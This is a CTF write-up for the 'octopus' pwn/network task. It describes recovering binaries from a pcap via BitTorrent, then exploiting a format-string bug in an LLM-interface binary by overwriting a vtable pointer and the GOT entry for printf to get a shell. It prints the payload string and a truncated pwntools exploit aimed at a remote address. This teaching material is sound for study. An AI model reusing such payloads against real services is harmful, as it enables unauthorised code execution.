---
title: "Запутанная история (octopus) - Alfa Surfing CTF"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["pwn", "forensics", "network", "format-string", "pie", "pcap", "proof-of-work", "checksec", "alfa-surfing-ctf", "ctf-writeup"]
summary: "Idea: BTH to get binaries and pwn format string on server"
source:
  name: "CTFtime writeup #40436"
  url: "https://ctftime.org/writeup/40436"
original_source: "https://revervand.github.io/ctf/writeup/2025/09/14/Alfa-Surfing-CTF-2025-Octopus-Writeup.html"
ctf:
  name: "Alfa Surfing CTF"
  challenge: "Запутанная история (octopus)"
---

## Metadata

- **CTF:** Alfa Surfing CTF
- **Task:** Запутанная история (octopus)
- **Author team:** C4T BuT S4D
- **CTFtime tags:** pwn, forensics, network
- **CTFtime:** <https://ctftime.org/writeup/40436>
- **Original writeup:** <https://revervand.github.io/ctf/writeup/2025/09/14/Alfa-Surfing-CTF-2025-Octopus-Writeup.html>

---
*Type: CTF task*

*Platform: Linux*

*Category: Pwn/Network*

*Idea: BTH to get binaries and pwn format string on server*

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/task_desc.png>)

This is a network + pwn task from [Alfa Surfing CTF 2025](<https://ctftime.org/event/2935>). We have a pcap with some traffic.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/pcap_base.png>)

So we need to filter TLS traffic and other stuff. And we get something like this. 

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/filtred_pcap.png>)

Filter:   
```  
!tls and (ip.addr != 217.12.104.100 and ip.addr != 91.206.127.56 and ip.addr != 216.58.211.228) && !dns  
```

We see suspicios BT-DHT packets. This is Bittorent protocol. And after we see Bittorent hash (BTH).

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/bth_traffic.png>)

And we can create a magnet link with this hash: `magnet:?xt=urn:btih:541dbfceb925d26c4f0f7687a9ad7bd0c1d9a7b5`  
And just use any Bittorent client.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/magnet_link_download.png>)

After downloading we need to analyze binaries. There is two binaries: server_with_pow.elf and run.elf.

**server_with_pow.elf**

It's just a simple TCP server that get string from client and calc MD5 hash.  
Hash need to start with 21 zero bit.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/server_analyze.png>)

If it's okay we run next binary `run.elf`.

**run.elf**

This binary provides us the interface to local LLM. 

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/run_elf_lama_show.png>)

And we can choose the user. In banner.txt we see just two of three users. But in code we see another user `melloy`.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/run_elf_users.png>)

And when we see how proceeded inputed string from user `melloy` we discover the format string vulnerablity in line 129.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/run_elf_format_string.png>)

So we need to PWN it!

My idea of exploitation is about only binary pwn. But author solution use LLM to get shell.

First we need to check what is on stack after our format string bug was triggered.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/gdb_stack1.png>)

And we see that we can addressing the stack where pointer to user object stored.   
And this pointer points to vtable of object. Function from vtable using after printf.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/vtable_usage.png>)

And when we make checksec on binary we see that there is no PIE and partitial RELRO.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/checksec.png>)

Let's check that GOT is writeable on debugger.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/perms_got.png>)

So there is final idea of exploitation.

1\. We overwrite data by pointer to Melloy object (which was vtable pointer) to offset in binary where address of `_start` placed. And it give us a cycle, after format string printing we run `_start` and `main` again.  
2\. We overwrite `printf` in GOT to `system` PLT. And this give us a shell, becase we call system on data that suppouse to be provided in printf.

See on the stack what happend after our overwriting.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/overwrite.png>)

vtable is overwrited and we jump to `_start`

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/vtable_hit.png>)

And after that we need to interact with process and type username and command after.

![](<https://revervand.github.io/assets/2025-09-15-Alfa-Surfing-CTF-2025-Octopus-Writeup/local_shell.png>)

So final payload is   
```  
"%34$n%4194328c%14$n%38488c%35$n_" + p64(0x703028 + 4) + p64(0x703028)  
```

Exploit code:  
```python  
#!/usr/bin/env python3  
from pwn import *

if __name__ == "__main__":  
#p = process('./run.elf')  
p = remote('46.62.167.155', 31337)

p.recvline()  
p.sendline(b'7vfv')

#gdb.attach(p, '''b *0x4250E3''')  
p.sendlineafter(b'
